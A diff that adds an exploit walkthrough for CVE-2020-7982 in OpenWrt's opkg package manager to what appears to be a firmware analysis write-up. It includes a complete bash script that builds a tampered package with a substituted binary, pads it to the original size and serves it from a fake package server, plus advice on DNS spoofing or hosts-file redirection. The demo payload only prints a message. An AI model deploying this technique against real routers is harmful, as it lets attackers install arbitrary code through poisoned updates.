@@ -71,5 +71,81 @@ DECIMAL       HEXADECIMAL     DESCRIPTION
 
 ---
 
+> Insecure package update configuration defaults including CVE-2020-7982.
+
+- opkg reads the SHA256sum field but the value has a leading space.The function checksum_hex2bin() tries to skip the space, but by mistake, it still uses the untrimmed version for decoding.This causes the decoding to fail silently, so no checksum gets stored.Later, the checksum check is skipped, allowing tampered packages to be installed without warning.
+
+- So to exploit this **CVE-2020-7982** , we need the patch our own binary with a packages(download from [https://download.openwrt.org](https://download.openwrt.org)).
+
+- We can find the architecture of the file which the opkg download from the server using **opkg print-architecture**.
+
+- After finding the architecture, we can write a script to host a server to mimic the server from which opkg fetch the files and checks its intergity(actually it fails here).
+
+`#!/bin/bash
+set -e
+rm -rf downloads.openwrt.org/ attr_20170915-1_i386_pentium4.ipk releases/
+
+wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/base/Packages.gz || true
+wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/base/Packages.sig || true
+wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/luci/Packages.gz || true
+wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/luci/Packages.sig || true
+wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/packages/Packages.gz || true
+wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/packages/Packages.sig || true
+wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/routing/Packages.gz || true
+wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/routing/Packages.sig || true
+wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/telephony/Packages.gz || true
+wget -x https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/telephony/Packages.sig || true
+wget -x http://downloads.openwrt.org/releases/18.06.2/targets/x86/generic/packages/Packages.gz || true
+wget -x http://downloads.openwrt.org/releases/18.06.2/targets/x86/generic/packages/Packages.sig || true
+
+mv downloads.openwrt.org/releases .
+rm -rf downloads.openwrt.org/
+
+wget https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/packages/attr_20170915-1_i386_pentium4.ipk
+ORIGINAL_FILESIZE=$(stat -c%s "attr_20170915-1_i386_pentium4.ipk")
+tar zxf attr_20170915-1_i386_pentium4.ipk
+rm attr_20170915-1_i386_pentium4.ipk
+mkdir data/
+cd data/
+tar zxvf ../data.tar.gz
+rm ../data.tar.gz
+rm -f /tmp/pwned.asm /tmp/pwned.o
+echo "section .text" >>/tmp/pwned.asm
+echo "global _start" >>/tmp/pwned.asm
+echo "_start:" >>/tmp/pwned.asm
+echo " mov edx,len" >>/tmp/pwned.asm
+echo " mov ecx,msg" >>/tmp/pwned.asm
+echo " mov ebx,1" >>/tmp/pwned.asm
+echo " mov eax,4" >>/tmp/pwned.asm
+echo " int 0x80" >>/tmp/pwned.asm
+echo " mov eax,1" >>/tmp/pwned.asm
+echo " int 0x80" >>/tmp/pwned.asm
+echo "section .data" >>/tmp/pwned.asm
+echo "msg db 'Nice Ch3ck',0xa" >>/tmp/pwned.asm
+echo "len equ $ - msg" >>/tmp/pwned.asm
+nasm -f elf32 /tmp/pwned.asm -o /tmp/pwned.o
+ld -m elf_i386 /tmp/pwned.o -o usr/bin/attr
+tar czvf ../data.tar.gz *
+cd ../
+rm -rf data/
+tar czvf attr_20170915-1_i386_pentium4.ipk control.tar.gz data.tar.gz debian-binary
+rm control.tar.gz data.tar.gz debian-binary
+MODIFIED_FILESIZE=$(stat -c%s "attr_20170915-1_i386_pentium4.ipk")
+FILESIZE_DELTA="$(($ORIGINAL_FILESIZE-$MODIFIED_FILESIZE))"
+if [ $FILESIZE_DELTA -gt 0 ]; then
+  head -c $FILESIZE_DELTA </dev/zero >>attr_20170915-1_i386_pentium4.ipk
+fi
+wget https://downloads.openwrt.org/releases/18.06.2/packages/i386_pentium4/packages/libattr_20170915-1_i386_pentium4.ipk
+mkdir -p releases/18.06.2/packages/i386_pentium4/packages/
+mv attr_20170915-1_i386_pentium4.ipk releases/18.06.2/packages/i386_pentium4/packages/
+mv libattr_20170915-1_i386_pentium4.ipk releases/18.06.2/packages/i386_pentium4/packages/
+sudo python3 -m http.server 80 --bind 0.0.0.0`
+
+- Above script, sets up a server and mimics as package server. But we should also configue the */etc/host* with our hosting ip. This only works when the opkg searchs for the package in the script's ip. There is also a another way to do without interacting or changes things in firmware, it is called DNS spoofing , which just redirects the request to our package server.
+
+- Then run **opkg update && opkg install attr** which configures the attr perfectly without any warning.
+
+- If we run attr, it displays *Nice Ch3ck*.
+
 		
 
